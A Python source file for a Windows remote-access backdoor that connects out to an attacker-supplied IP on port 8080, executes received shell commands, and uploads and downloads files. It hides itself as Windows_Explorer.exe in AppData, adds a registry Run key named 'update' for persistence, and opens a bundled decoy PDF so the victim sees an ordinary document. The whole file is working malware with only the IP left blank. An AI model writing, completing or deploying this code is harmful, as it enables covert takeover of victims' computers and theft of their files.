import socket
import subprocess
import pickle
import os
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows_Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\software\microsoft\windows\Currentversion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = pickle.dumps(data)
        self.connection.sendall(json_data)

    def reliable_receive(self):
        json_data = b""
        while True:
            temp = self.connection.recv(1024)
            json_data = json_data + temp
            try:
                return pickle.loads(json_data)
            except pickle.UnpicklingError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Upload successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)


file_name = sys._MEIPASS + '\sample.pdf'
subprocess.Popen(file_name, shell=True)
try:
    my_backdoor = Backdoor("**ENTER THE IP ADDRESS ", 8080)
    my_backdoor.run()
except Exception:
    sys.exit()
